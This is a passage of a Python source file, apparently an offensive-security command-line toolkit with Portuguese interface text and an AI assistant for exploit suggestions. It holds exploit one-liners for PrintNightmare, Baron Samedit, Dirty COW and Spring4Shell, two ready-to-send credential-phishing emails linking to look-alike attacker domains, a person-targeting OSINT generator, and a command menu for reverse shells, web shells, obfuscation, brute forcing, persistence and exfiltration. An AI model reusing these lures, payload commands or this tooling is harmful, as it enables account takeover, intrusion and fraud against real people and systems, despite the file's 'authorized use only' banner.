                "desc": "Windows Print Spooler RCE/LPE",
                "affect": "Windows 7-11, Server 2008-2019",
                "poc": "Invoke-Nightmare -NewUser 'hacker' -NewPassword 'P@ssw0rd'"
            },
            "proxylogon": {
                "cve": "CVE-2021-26855", "cvss": 9.8, "severity": "CRITICAL",
                "desc": "Microsoft Exchange SSRF + RCE chain",
                "affect": "Exchange 2013-2019",
                "poc": "python proxylogon.py target email password"
            },
            "zerologon": {
                "cve": "CVE-2020-1472", "cvss": 10.0, "severity": "CRITICAL",
                "desc": "Netlogon privilege escalation — domain takeover",
                "affect": "Windows Server 2008-2019",
                "poc": "python zerologon_tester.py dc_name dc_ip"
            },
            "dirtycow": {
                "cve": "CVE-2016-5195", "cvss": 7.8, "severity": "HIGH",
                "desc": "Linux kernel race condition privilege escalation",
                "affect": "Linux kernel < 4.8.3",
                "poc": "gcc -o dirty dirty.c -lpthread && ./dirty password"
            },
            "spring4shell": {
                "cve": "CVE-2022-22965", "cvss": 9.8, "severity": "CRITICAL",
                "desc": "Spring Framework RCE via data binding",
                "affect": "Spring Framework 5.3.x < 5.3.18",
                "poc": "curl -X POST http://target/path --data '...class.module.classLoader...'"
            },
            "sudo_baron_samedit": {
                "cve": "CVE-2021-3156", "cvss": 7.8, "severity": "HIGH",
                "desc": "Sudo heap-based buffer overflow privilege escalation",
                "affect": "Sudo < 1.9.5p2",
                "poc": "sudoedit -s '\\' $(python3 -c 'print(\"A\"*65536)')"
            },
        }

    def search(self, query: str) -> List[Dict]:
        results = []
        q = query.lower()
        for name, data in self.vulns.items():
            if (q in name.lower() or q in data.get("desc", "").lower() or
                q in data.get("cve", "").lower() or q in data.get("affect", "").lower()):
                results.append({"name": name, **data})
        return results

    def show(self, name: str) -> Optional[Dict]:
        v = self.vulns.get(name.lower())
        if not v:
            results = self.search(name)
            if results:
                v = results[0]
                name = v["name"]
            else:
                log.error(f"Vulnerabilidade '{name}' não encontrada")
                return None
        
        severity_colors = {"CRITICAL": C.FAIL, "HIGH": C.BRED, "MEDIUM": C.WARN, "LOW": C.BBLUE}
        color = severity_colors.get(v.get("severity", "INFO"), C.WHITE)
        
        print(f"\n{C.CYAN}{'═'*60}{C.RESET}")
        print(f"  {C.BOLD}{name.upper()}{C.RESET}")
        print(f"  {color}{v.get('severity','')}{C.RESET} | {C.YELLOW}CVSS: {v.get('cvss','N/A')}{C.RESET} | {v.get('cve','')}")
        print(f"{C.CYAN}{'─'*60}{C.RESET}")
        print(f"  {C.BOLD}Descrição:{C.RESET} {v.get('desc','')}")
        print(f"  {C.BOLD}Afeta:{C.RESET}     {v.get('affect','')}")
        if "payload" in v:
            print(f"  {C.BOLD}Payload:{C.RESET}   {C.BRED}{v['payload']}{C.RESET}")
        if "poc" in v:
            print(f"  {C.BOLD}PoC:{C.RESET}       {C.YELLOW}{v['poc']}{C.RESET}")
        print(f"{C.CYAN}{'═'*60}{C.RESET}\n")
        return v

    def list_all(self):
        print(f"\n{C.CYAN}{'─'*50}{C.RESET}")
        print(f"  {C.BOLD}Vulnerabilidades no DB Local:{C.RESET}")
        for name, data in self.vulns.items():
            sev = data.get("severity", "")
            colors = {"CRITICAL": C.FAIL, "HIGH": C.BRED, "MEDIUM": C.WARN}
            color = colors.get(sev, C.WHITE)
            print(f"  {color}{sev:8s}{C.RESET} {C.YELLOW}{data.get('cve',''):20s}{C.RESET} {name}")
        print(f"{C.CYAN}{'─'*50}{C.RESET}\n")

vulndb = VulnDB()

# ─────────────────────────────────────────────
#  SOCIAL ENGINEERING TOOLKIT
# ─────────────────────────────────────────────
class SocialEngineering:
    def phishing_templates(self) -> Dict[str, str]:
        templates = {
            "office365_creds": """From: IT Security <security@{domain}>
To: {target_email}
Subject: Urgent: Your Office 365 password expires in 24 hours

Dear {name},

Your Office 365 account password will expire in 24 hours.
Please update your password immediately at:

https://login.microsoftonline.com.{attacker_domain}/common/oauth2/v2.0/authorize

If you do not update your password, you will lose access to your email.

IT Security Team""",
            "payroll_update": """From: HR Department <hr@{domain}>
To: {target_email}
Subject: Action Required: Update Your Direct Deposit Information

Dear {name},

Our payroll system requires you to verify your banking information
to ensure your salary is deposited correctly.

Please click below to update your information:
http://{attacker_domain}/payroll/update

This must be completed by Friday to avoid payment delay.

Human Resources""",
        }
        
        print(f"\n  {C.CYAN}Templates de Phishing:{C.RESET}")
        for name in templates:
            print(f"  {C.YELLOW}→{C.RESET} {name}")
        print(f"\n  {C.WARN}Uso exclusivo em campanhas autorizadas de awareness!{C.RESET}\n")
        return templates

    def osint_person(self, name: str, email: str = "", company: str = "") -> Dict:
        """OSINT básico de pessoa — gera dorks"""
        dorks = {
            "google_name": f'"{name}" site:linkedin.com',
            "google_email": f'"{email}"' if email else "",
            "google_company": f'"{name}" "{company}"' if company else "",
            "have_i_been_pwned": f"https://haveibeenpwned.com/account/{urllib.parse.quote(email)}" if email else "",
            "github": f"https://github.com/search?q={urllib.parse.quote(name)}",
            "linkedin": f"https://www.linkedin.com/search/results/people/?keywords={urllib.parse.quote(name)}",
            "instagram": f"https://www.instagram.com/{name.replace(' ','.')}",
            "twitter": f"https://twitter.com/search?q={urllib.parse.quote(name)}",
            "shodan_email": f"https://www.shodan.io/search?query={urllib.parse.quote(email)}" if email else "",
        }
        
        print(f"\n  {C.CYAN}OSINT: {name}{C.RESET}")
        for k, v in dorks.items():
            if v:
                print(f"  {C.YELLOW}{k:25s}{C.RESET} {v}")
        return dorks

se_toolkit = SocialEngineering()

# ═══════════════════════════════════════════════════
#  FUNÇÃO show_banner DEFINIDA ANTES DE CommandProcessor
# ═══════════════════════════════════════════════════
def show_banner(args=None):
    banner = f"""
{C.CYAN}
 ██╗ █████╗ ██████╗ ██╗   ██╗██╗███████╗
 ██║██╔══██╗██╔══██╗██║   ██║██║██╔════╝
 ██║███████║██████╔╝██║   ██║██║███████╗
 ██║██╔══██║██╔══██╗╚██╗ ██╔╝██║╚════██║
 ██║██║  ██║██║  ██║ ╚████╔╝ ██║███████║
 ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝{C.RESET}
{C.BRED}         Just A Rather Very Intelligent Security System{C.RESET}
{C.YELLOW}         Ultra Pro Max Plus — {CODENAME} — v{VERSION}{C.RESET}
{C.DIM}         For authorized use only | Educational purposes{C.RESET}

  {C.GREEN}[*]{C.RESET} Session: {C.BOLD}{session.id}{C.RESET}   {C.GREEN}[*]{C.RESET} Python {sys.version.split()[0]}
  {C.GREEN}[*]{C.RESET} AI: {C.BOLD}{'ONLINE (' + AI_MODEL + ')' if ai.active else 'OFFLINE (set ai_key <chave>)'}{C.RESET}
  {C.GREEN}[*]{C.RESET} Log: {log.log_file}
  {C.GREEN}[*]{C.RESET} Workspace: {WORKSPACE_DIR}
  {C.GREEN}[*]{C.RESET} Reports: {REPORT_DIR}
  
  {C.DIM}Type 'help' for commands | 'help <topic>' for details{C.RESET}
"""
    print(banner)

# ─────────────────────────────────────────────
#  PROCESSADOR DE COMANDOS (CLI SHELL)
# ─────────────────────────────────────────────
class CommandProcessor:
    def __init__(self):
        self.running = True
        self.commands = {
            # Sistema
            "help":     self.cmd_help,
            "?":        self.cmd_help,
            "exit":     self.cmd_exit,
            "quit":     self.cmd_exit,
            "clear":    self.cmd_clear,
            "cls":      self.cmd_clear,
            "banner":   show_banner,
            "status":   lambda a: session.status(),
            "save":     lambda a: session.save(),
            "load":     lambda a: session.load(a[0]) if a else log.error("load <session_id>"),
            "config":   self.cmd_config,
            "set":      self.cmd_set,
            "note":     self.cmd_note,
            "notes":    lambda a: [print(f"  {i+1}. {n}") for i,n in enumerate(session.notes)],
            "history":  lambda a: [print(f"  {h['time'][:19]} {h['cmd']}") for h in session.history[-20:]],
            "target":   self.cmd_target,
            "scope":    self.cmd_scope,
            "loot":     lambda a: [print(f"  [{l['type']}] {l['name']} ({l['time'][:19]})") for l in session.loot],
            "creds":    lambda a: [print(f"  {c['service']}://{c['user']}:{c['pwd']}@{c['source']}") for c in session.creds],
            "findings": self.cmd_findings,
            "shell":    self.cmd_shell,
            "exec":     self.cmd_exec,
            "!":        self.cmd_exec,
            # IA
            "ai":       self.cmd_ai,
            "ask":      self.cmd_ai,
            "analyze":  self.cmd_analyze,
            "exploit_suggest": self.cmd_exploit_suggest,
            "ctf":      self.cmd_ctf,
            "pivot_advice": self.cmd_pivot_advice,
            "ai_stats": lambda a: ai.stats(),
            "ai_reset": lambda a: ai.reset_conversation(),
            "ai_init":  self.cmd_ai_init,
            # Recon
            "recon":    self.cmd_full_recon,
            "dns":      self.cmd_dns,
            "whois":    self.cmd_whois,
            "subdomain": self.cmd_subdomain,
            "ct":       self.cmd_ct,
            "headers":  self.cmd_headers,
            "tech":     self.cmd_tech,
            "dorks":    self.cmd_dorks,
            "shodan":   self.cmd_shodan,
            # Network
            "ping_sweep": self.cmd_ping_sweep,
            "portscan": self.cmd_portscan,
            "nmap":     self.cmd_nmap,
            "udp":      self.cmd_udp,
            "osfingerprint": self.cmd_osfingerprint,
            "banner_grab": self.cmd_banner_grab,
            # Web
            "web_audit": self.cmd_web_audit,
            "dirscan":  self.cmd_dirscan,
            "sqli":     self.cmd_sqli,
            "xss":      self.cmd_xss,
            "lfi":      self.cmd_lfi,
            "ssrf":     self.cmd_ssrf,
            "cors":     self.cmd_cors,
            "redirect": self.cmd_redirect,
            "cms":      self.cmd_cms,
            # Brute
            "ssh_brute": self.cmd_ssh_brute,
            "http_brute": self.cmd_http_brute,
            "ftp_brute": self.cmd_ftp_brute,
            "hash_crack": self.cmd_hash_crack,
            # Payloads
            "revshell": self.cmd_revshell,
            "webshell": lambda a: web.web_shells(),
            "msfvenom": self.cmd_msfvenom,
            "wordlist": self.cmd_wordlist,
            "obfuscate": self.cmd_obfuscate,
            # Post-exploit
            "linprivesc": lambda a: post_exploit.linux_privesc_checks(),
            "winprivesc": lambda a: post_exploit.windows_privesc_checks(),
            "persist":  self.cmd_persist,
            "lateral":  lambda a: post_exploit.lateral_movement(),
            "exfil":    lambda a: post_exploit.data_exfil_techniques(),
            # VulnDB
            "vuln":     self.cmd_vuln,
            "vulndb":   lambda a: vulndb.list_all(),
            # OSINT
            "osint":    self.cmd_osint,
            "osint_person": self.cmd_osint_person,
            "phishing": lambda a: se_toolkit.phishing_templates(),
            # Report
            "report":   self.cmd_report,
            "report_json": lambda a: report.generate_json(),
            "report_md": lambda a: report.generate_markdown(),
            # Automation
            "full_recon": self.cmd_full_recon,
            "full_web_audit": self.cmd_full_web_audit,
            "macro":    self.cmd_macro,
            # Utils
            "encode":   self.cmd_encode,
            "decode":   self.cmd_decode,
            "hash":     self.cmd_hash,
            "ip_info":  self.cmd_ip_info,
            "cidr":     self.cmd_cidr,
            "hex":      self.cmd_hex,
            "rot13":    self.cmd_rot13,
            "url_encode": lambda a: print(urllib.parse.quote(" ".join(a))),
            "url_decode": lambda a: print(urllib.parse.unquote(" ".join(a))),
            "listen":   self.cmd_listen,
            "extract_emails": self.cmd_extract_emails,
            "check_tool": self.cmd_check_tools,
            "install_deps": self.cmd_install_deps,
        }

    def parse(self, line: str) -> Tuple[str, List[str]]:
        line = line.strip()
        if not line:
            return "", []
        
        # Substituição de variáveis $VAR
        for k, v in session.variables.items():
            line = line.replace(f"${k}", v)
        
        parts = line.split()
        cmd = parts[0].lower()
        args = parts[1:]
        return cmd, args

    def execute(self, line: str):
        cmd, args = self.parse(line)
        if not cmd:
            return
        
        # Salvar no histórico
        session.history.append({
            "time": datetime.now().isoformat(),
            "cmd": line
        })
        
        # Comandos do sistema prefixados com !
        if line.startswith("!") or line.startswith("$"):
            self.cmd_exec(args if args else [line[1:]])
            return
        
        if cmd in self.commands:
            try:
                self.commands[cmd](args)
            except KeyboardInterrupt:
                print(f"\n{C.WARN}Interrompido pelo usuário{C.RESET}")
            except Exception as e:
                log.error(f"Erro executando '{cmd}': {e}")
                import traceback
                traceback.print_exc()
        else:
            # Tentar como comando shell
            log.warn(f"Comando desconhecido: '{cmd}'. Digite 'help' para ajuda.")
            log.info(f"Dica: use '!{cmd}' para executar como comando shell")

    # ── IMPLEMENTAÇÕES DOS COMANDOS ──
    def cmd_help(self, args):
        if args:
            topic = args[0]
            help_map = {
                "ai": "Comandos de IA:\n  ai <pergunta> — Perguntar à IA\n  analyze [target] — Analisar alvo com IA\n  exploit_suggest <serviço> <versão>\n  ctf <descrição> — Ajuda com CTF\n  ai_reset — Resetar conversa\n  ai_stats — Estatísticas de tokens",
                "recon": "Reconhecimento:\n  recon <target> — Full recon\n  dns <domain> — DNS lookup\n  whois <target> — WHOIS\n  subdomain <domain> — Enum subdomínios\n  ct <domain> — Certificate Transparency\n  dorks <domain> — Google Dorks\n  tech <url> — Detectar tecnologias",
                "web": "Web Security:\n  web_audit <url> — Auditoria completa\n  dirscan <url> — Dir/file bruteforce\n  sqli <url> — SQL Injection test\n  xss <url> — XSS test\n  lfi <url> — LFI test\n  ssrf <url> — SSRF test\n  cors <url> — CORS check\n  cms <url> — CMS detection",
                "network": "Network:\n  ping_sweep <cidr> — Ping sweep\n  portscan <target> [mode] — Port scan\n  nmap <target> [args] — nmap wrapper\n  udp <target> — UDP scan\n  osfingerprint <target> — OS fingerprint",
                "payload": "Payloads:\n  revshell <lhost> <lport> [tipo] — Reverse shells\n  webshell — Web shells\n  msfvenom <tipo> <lhost> <lport> — MSFvenom helper\n  obfuscate <comando> — Ofuscar comando",
                "post": "Post-Exploitation:\n  linprivesc — Linux privesc checklist\n  winprivesc — Windows privesc checklist\n  persist [linux|windows] — Técnicas de persistência\n  lateral — Lateral movement\n  exfil — Exfiltração de dados",
            }
            if topic in help_map:
                print(f"\n{C.CYAN}{help_map[topic]}{C.RESET}\n")
            else:
                print(f"Tópicos disponíveis: {', '.join(help_map.keys())}")
            return
        
        print(f"""
{C.CYAN}{'═'*70}{C.RESET}
{C.BOLD}  JARVIS Ultra Pro Max — Comandos Disponíveis{C.RESET}
{C.CYAN}{'═'*70}{C.RESET}

  {C.YELLOW}SISTEMA{C.RESET}
    status, save, load, config, set, clear, exit
    note, notes, target, scope, creds, loot, findings, history
    shell, exec (ou !comando), listen <port>
    check_tool, install_deps

  {C.YELLOW}INTELIGÊNCIA ARTIFICIAL{C.RESET}
    ai <pergunta>              Conversar com a IA
    analyze [target]           Análise IA do alvo
    exploit_suggest <s> <v>    Sugerir exploits
    ctf <descrição>            Ajuda CTF
    pivot_advice <info>        Aconselhamento de pivoting
    ai_reset, ai_stats, ai_init <key>

  {C.YELLOW}RECONHECIMENTO{C.RESET}
    recon <target>             Full recon automatizado
    dns <domain>               DNS lookup completo
    whois <target>             WHOIS lookup
    subdomain <domain>         Enum subdomínios
    ct <domain>                Certificate Transparency
    headers <url>              Análise de headers HTTP
    tech <url>                 Detecção de tecnologias
    dorks <domain>             Google Dorks
    shodan <query>             Shodan search helper

  {C.YELLOW}NETWORK{C.RESET}
    ping_sweep <cidr>          Ping sweep de rede
    portscan <target> [mode]   Port scan (mode: common/top1000/full)
    nmap <target> [args]       Wrapper nmap
    udp <target>               UDP scan
    osfingerprint <target>     OS fingerprinting
    banner_grab <target> <port> Banner grabbing

  {C.YELLOW}WEB SECURITY{C.RESET}
    web_audit <url>            Auditoria web completa
    dirscan <url>              Dir/file bruteforce
    sqli <url>                 SQL Injection test
    xss <url>                  XSS test
    lfi <url>                  LFI test
    ssrf <url>                 SSRF test
    cors <url>                 CORS misconfiguration
    redirect <url>             Open Redirect test
    cms <url>                  CMS detection & audit

  {C.YELLOW}BRUTE FORCE{C.RESET}
    ssh_brute <host> [port]    SSH brute force
    http_brute <url> <uf> <pf> <err>  HTTP form brute
    ftp_brute <host> [port]    FTP brute force
    hash_crack <hash>          Hash cracking

  {C.YELLOW}PAYLOADS{C.RESET}
    revshell <lhost> <lport> [tipo|all]  Reverse shells
    webshell                   Web shell collection
    msfvenom <tipo> <lh> <lp>  MSFvenom helper
    wordlist <kw1> <kw2>...    Gerar wordlist customizada
    obfuscate <cmd>            Técnicas de obfuscação

  {C.YELLOW}POST-EXPLOITATION{C.RESET}
    linprivesc                 Linux privilege escalation
    winprivesc                 Windows privilege escalation
    persist [linux|windows]    Técnicas de persistência
    lateral                    Lateral movement
    exfil                      Exfiltração de dados

  {C.YELLOW}VULN DB{C.RESET}
    vulndb                     Listar vulnerabilidades
    vuln <nome|cve>            Detalhes de vulnerabilidade

  {C.YELLOW}OSINT / SE{C.RESET}
    osint <domain>             OSINT completo de domínio
    osint_person <nome>        OSINT de pessoa
    phishing                   Templates de phishing

  {C.YELLOW}REPORT{C.RESET}
    report [título]            Gerar relatório HTML
    report_json                Relatório JSON
    report_md                  Relatório Markdown

  {C.YELLOW}UTILITÁRIOS{C.RESET}
    encode <base64|hex|rot13|url> <texto>
    decode <base64|hex|rot13|url> <texto>
    hash <md5|sha1|sha256|sha512> <texto>
    cidr <cidr>                Info de rede CIDR
    listen <porta>             Listener netcat simples
    extract_emails <texto>     Extrair emails
    macro <save|run|list> ...  Automação com macros

  {C.DIM}Tip: help <tópico> para mais detalhes | !<cmd> para shell | $VAR para variáveis{C.RESET}
{C.CYAN}{'═'*70}{C.RESET}
""")

    def cmd_exit(self, args):
        log.info("Encerrando JARVIS...")
        if session.creds or log.findings:
            print(f"\n  {C.WARN}[!] Você tem dados não salvos! Salvando sessão...{C.RESET}")
            session.save()
        self.running = False

    def cmd_clear(self, args):
        os.system("clear" if os.name != "nt" else "cls")

    def cmd_config(self, args):
        config.show()

    def cmd_set(self, args):
        if len(args) < 2:
            print(f"  Uso: set <variável> <valor>")
            print(f"  Exemplos: set LHOST 10.10.10.10")
            print(f"            set ai_key sk-ant-...")
            print(f"            set timeout 5")
            return
        
        key = args[0].upper()
        val = " ".join(args[1:])
        
        if key == "AI_KEY":
            config.set("AI", "api_key", val)
            ai.initialize(val)
            return
        
        session.variables[key] = val
        log.success(f"${key} = {val}")

    def cmd_note(self, args):
        if not args:
            print("Uso: note <texto da nota>")
            return
        note = " ".join(args)
        session.notes.append(f"[{datetime.now().strftime('%H:%M')}] {note}")
        log.success("Nota adicionada")

    def cmd_target(self, args):
        if not args:
            print(f"  Target atual: {session.target or 'Nenhum'}")
            if session.targets:
                print(f"  Targets: {', '.join(session.targets)}")
            return
        session.target = args[0]
        if args[0] not in session.targets:
            session.targets.append(args[0])
        session.variables["TARGET"] = args[0]
        log.success(f"Target definido: {args[0]}")

    def cmd_scope(self, args):
        if not args:
            print(f"  Scope: {', '.join(session.scope) or 'Vazio'}")
            return
        if args[0] == "add":
            session.scope.extend(args[1:])
            log.success(f"Adicionado ao scope: {args[1:]}")
        elif args[0] == "clear":
            session.scope = []
            log.info("Scope limpo")

    def cmd_findings(self, args):
        if not log.findings:
            log.info("Nenhum finding registrado")
            return
        print(f"\n  {C.BOLD}Findings ({len(log.findings)}):{C.RESET}")
        for f in log.findings:
            sev_colors = {"CRITICAL": C.FAIL, "HIGH": C.BRED, "MEDIUM": C.WARN, "LOW": C.BBLUE}
            color = sev_colors.get(f["severity"], C.WHITE)
            print(f"  {color}[{f['severity']:8s}]{C.RESET} {f['title']} — {f['target']}")

    def cmd_shell(self, args):
        shell = os.environ.get("SHELL", "/bin/bash")
        log.info(f"Abrindo shell: {shell}")
        os.system(shell)

    def cmd_exec(self, args):
        cmd = " ".join(args)
        if not cmd:
            return
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print(f"{C.DIM}{result.stderr}{C.RESET}")
        except subprocess.TimeoutExpired:
            log.error("Comando timeout (60s)")
        except Exception as e:
            log.error(f"Erro: {e}")

    def cmd_ai(self, args):
        if not args:
            print("Uso: ai <pergunta>")
            return
        if not ai.active:
            key = config.get("AI", "api_key")
            if key:
                ai.initialize(key)
            else:
                log.error("IA offline. Configure com: set ai_key <sua_chave_anthropic>")
                return
        
        question = " ".join(args)
        context = f"Target: {session.target}\nFindings: {len(log.findings)}\nCreds: {len(session.creds)}"
        
        print(f"\n{C.AI}{'─'*60}{C.RESET}")
        response = ai.chat(question, context)
        print(response)
        print(f"{C.AI}{'─'*60}{C.RESET}\n")

    def cmd_ai_init(self, args):
        if not args:
            print("Uso: ai_init <api_key>")
            return
        key = args[0]
        config.set("AI", "api_key", key)
        ai.initialize(key)

    def cmd_analyze(self, args):
        target = args[0] if args else session.target
        if not target:
            log.error("Defina um target: target <host>")
            return
        if not ai.active:
            log.error("IA offline. Configure com: set ai_key <chave>")
            return
        scan_data = json.dumps(session.scan_results, indent=2, default=str)[:3000]
        result = ai.analyze_target(target, scan_data if session.scan_results else None)
        print(f"\n{C.AI}{result}{C.RESET}\n")

    def cmd_exploit_suggest(self, args):
        if len(args) < 2:
            print("Uso: exploit_suggest <serviço> <versão>")
            return
        if not ai.active:
            log.error("IA offline")
            return
        result = ai.suggest_exploits(args[0], args[1])
        print(f"\n{C.AI}{result}{C.RESET}\n")

    def cmd_ctf(self, args):
        if not args:
            print("Uso: ctf <descrição do desafio>")
            return
        if not ai.active:
            log.error("IA offline")
            return
        result = ai.ctf_help(" ".join(args))
        print(f"\n{C.AI}{result}{C.RESET}\n")

    def cmd_pivot_advice(self, args):
        info = " ".join(args) if args else f"Target: {session.target}"
        if not ai.active:
            log.error("IA offline")
            return
        result = ai.pivoting_advice(info)
        print(f"\n{C.AI}{result}{C.RESET}\n")

    def cmd_dns(self, args):
        if not args:
            print("Uso: dns <domain>")
            return
        result = recon.dns_lookup(args[0])
        print(f"\n  {C.CYAN}DNS: {args[0]}{C.RESET}")
        for rtype, records in result.get("records", {}).items():
            print(f"  {C.YELLOW}{rtype:6s}{C.RESET} {', '.join(records)}")
        print()

    def cmd_whois(self, args):
        if not args:
            print("Uso: whois <domain|ip>")
            return
        result = recon.whois_lookup(args[0])
        print(f"\n{result}\n")

    def cmd_subdomain(self, args):
        if not args:
            print("Uso: subdomain <domain> [wordlist]")
            return
        wordlist = args[1] if len(args) > 1 else None
        recon.subdomain_enum(args[0], wordlist)

    def cmd_ct(self, args):
        if not args:
            print("Uso: ct <domain>")
            return
        recon.certificate_transparency(args[0])

    def cmd_headers(self, args):
        if not args:
            print("Uso: headers <url>")
            return
        recon.http_headers(args[0])

    def cmd_tech(self, args):
        if not args:
            print("Uso: tech <url>")
            return
        techs = recon.tech_detect(args[0])
        if techs:
            log.success(f"Tecnologias detectadas: {', '.join(techs)}")
        else:
            log.info("Nenhuma tecnologia detectada")

    def cmd_dorks(self, args):
        if not args:
            print("Uso: dorks <domain>")
            return
        recon.google_dorks(args[0])

    def cmd_shodan(self, args):
        query = " ".join(args) if args else session.target or "target"
        recon.shodan_search(query)

    def cmd_ping_sweep(self, args):
        if not args:
            print("Uso: ping_sweep <cidr> (ex: 192.168.1.0/24)")
            return
        scanner.ping_sweep(args[0])

    def cmd_portscan(self, args):
        if not args:
            print("Uso: portscan <target> [mode:common|top1000|full] [ports:80,443,...]")
            return
        target = args[0]
        mode = args[1] if len(args) > 1 else "common"
        
        custom_ports = None
        if len(args) > 2 and "," in args[2]:
            custom_ports = [int(p) for p in args[2].split(",")]
        
        scanner.port_scan(target, custom_ports, mode)

    def cmd_nmap(self, args):
        if not args:
            print("Uso: nmap <target> [args nmap]")
            return
        target = args[0]
        nmap_args = " ".join(args[1:]) if len(args) > 1 else "-sV -sC -O"
        result = scanner.nmap_wrapper(target, nmap_args)
        if result:
            print(result)

    def cmd_udp(self, args):
        if not args:
            print("Uso: udp <target>")
            return
        scanner.udp_scan(args[0])

    def cmd_osfingerprint(self, args):
        if not args:
            print("Uso: osfingerprint <target>")
            return
        scanner.os_fingerprint(args[0])

    def cmd_banner_grab(self, args):
        if len(args) < 2:
            print("Uso: banner_grab <target> <port>")
            return
        banner = scanner.service_version(args[0], int(args[1]))
        print(f"\n  Banner: {banner or 'Sem resposta'}\n")

    def cmd_web_audit(self, args):
        if not args:
            print("Uso: web_audit <url>")
            return
        automation.full_web_audit(args[0])

    def cmd_dirscan(self, args):
        if not args:
            print("Uso: dirscan <url> [wordlist] [extensões]")
            return
        url = args[0]
        wordlist = args[1] if len(args) > 1 else None
        ext = args[2] if len(args) > 2 else "php,html,txt,bak,old,js,json"
        web.dir_bruteforce(url, wordlist, ext)

    def cmd_sqli(self, args):
        if not args:
            print("Uso: sqli <url?param=value>")
            return
        web.sql_injection_test(args[0])

    def cmd_xss(self, args):
        if not args:
            print("Uso: xss <url?param=value>")
            return
        web.xss_test(args[0])

    def cmd_lfi(self, args):
        if not args:
            print("Uso: lfi <url?param=value>")
            return
        web.lfi_test(args[0])

    def cmd_ssrf(self, args):
        if not args:
            print("Uso: ssrf <url?param=value>")
            return
        web.ssrf_test(args[0])

    def cmd_cors(self, args):
        if not args:
            print("Uso: cors <url>")
            return
        web.cors_check(args[0])

    def cmd_redirect(self, args):
        if not args:
            print("Uso: redirect <url>")
            return
        web.open_redirect_test(args[0])

    def cmd_cms(self, args):
        if not args:
            print("Uso: cms <url>")
            return
        result = web.cms_detect(args[0])
        if result:
            log.info(f"CMS detectado: {result}")
        else:
            log.info("Nenhum CMS comum detectado")

    def cmd_ssh_brute(self, args):
        if not args:
            print("Uso: ssh_brute <host> [port] [userfile] [passfile]")
            return
        host = args[0]
        port = int(args[1]) if len(args) > 1 else 22
        brute.ssh_brute(host, port)

    def cmd_http_brute(self, args):
        if len(args) < 4:
            print("Uso: http_brute <url> <user_field> <pass_field> <error_string>")
            return
        brute.http_brute(args[0], args[1], args[2], args[3])

    def cmd_ftp_brute(self, args):
        if not args:
            print("Uso: ftp_brute <host> [port]")
            return
        port = int(args[1]) if len(args) > 1 else 21
        brute.ftp_brute(args[0], port)

    def cmd_hash_crack(self, args):
        if not args:
            print("Uso: hash_crack <hash> [wordlist]")
            return
        wordlist = args[1] if len(args) > 1 else None
        brute.hash_crack(args[0], wordlist)

    def cmd_revshell(self, args):
        if len(args) < 2:
            print("Uso: revshell <lhost> <lport> [tipo|all]")
            print("Tipos: bash, python3, php, nc, perl, ruby, powershell, go, all")
            return
        lhost = args[0]
        lport = args[1]
        stype = args[2] if len(args) > 2 else "all"
        payload_gen.reverse_shell(lhost, lport, stype)

    def cmd_msfvenom(self, args):
        if len(args) < 3:
            print("Uso: msfvenom <tipo> <lhost> <lport> [formato] [encoder]")
            print("Tipos: linux/x64/rev, windows/rev, windows/x64/rev, android/rev, php/rev, ...")
            return
        fmt = args[3] if len(args) > 3 else "elf"
        enc = args[4] if len(args) > 4 else ""
        payload_gen.msfvenom_helper(args[0], args[1], args[2], fmt, enc)

    def cmd_wordlist(self, args):
        if not args:
            print("Uso: wordlist <keyword1> <keyword2> ...")
            return
        payload_gen.generate_wordlist(args)

    def cmd_obfuscate(self, args):
        if not args:
            print("Uso: obfuscate <comando>")
            return
        payload_gen.obfuscate_command(" ".join(args))

    def cmd_persist(self, args):
        os_type = args[0] if args else "linux"
        post_exploit.persistence_techniques(os_type)

    def cmd_vuln(self, args):
        if not args:
            print("Uso: vuln <nome|cve>")
            vulndb.list_all()
            return
        vulndb.show(" ".join(args))

    def cmd_osint(self, args):
        if not args:
            print("Uso: osint <domain>")
            return
        target = args[0]
        log.info(f"OSINT completo em {target}")
        recon.google_dorks(target)
        recon.dns_lookup(target)
        recon.whois_lookup(target)
        recon.certificate_transparency(target)
        recon.shodan_search(target)

    def cmd_osint_person(self, args):
        if not args:
            print("Uso: osint_person <nome> [email] [empresa]")
            return
        name = args[0]
        email = args[1] if len(args) > 1 else ""
        company = args[2] if len(args) > 2 else ""
        se_toolkit.osint_person(name, email, company)

    def cmd_report(self, args):
        title = " ".join(args) if args else f"Pentest Report — {session.target or 'Target'}"
        fname = report.generate_html(title)
        report.generate_json()
        report.generate_markdown()
        log.success(f"Relatórios gerados em: {REPORT_DIR}")
        print(f"  HTML: {fname}")

    def cmd_full_recon(self, args):
        target = args[0] if args else session.target
        if not target:
            print("Uso: recon <target>")
            return
        automation.full_recon(target)

    def cmd_full_web_audit(self, args):
        if not args:
            print("Uso: full_web_audit <url>")
            return
        automation.full_web_audit(args[0])

    def cmd_macro(self, args):
        if not args:
            print("Uso: macro <save|run|list> [nome] [cmds...]")
            return
        
        action = args[0]
        if action == "list":
            automation.list_macros()
        elif action == "save" and len(args) >= 3:
            automation.save_macro(args[1], args[2:])
        elif action == "run" and len(args) >= 2:
            automation.run_macro(args[1])
        else:
            print("macro save <nome> <cmd1> <cmd2>...\nmacro run <nome>\nmacro list")

    def cmd_encode(self, args):
        if len(args) < 2:
            print("Uso: encode <base64|hex|rot13|url> <texto>")
            return
        method = args[0].lower()
        text = " ".join(args[1:])
        
        encoders = {
            "base64": lambda t: base64.b64encode(t.encode()).decode(),
            "hex":    lambda t: t.encode().hex(),
            "rot13":  lambda t: t.translate(str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm")),
            "url":    lambda t: urllib.parse.quote(t),
        }
        
        fn = encoders.get(method)
        if fn:
            print(f"  {C.SUCCESS}→{C.RESET} {fn(text)}")
        else:
            print(f"Métodos: {', '.join(encoders.keys())}")

    def cmd_decode(self, args):
        if len(args) < 2:
            print("Uso: decode <base64|hex|rot13|url> <texto>")
            return
        method = args[0].lower()
        text = " ".join(args[1:])
        
        try:
            decoders = {
                "base64": lambda t: base64.b64decode(t).decode("utf-8", errors="replace"),
                "hex":    lambda t: bytes.fromhex(t).decode("utf-8", errors="replace"),
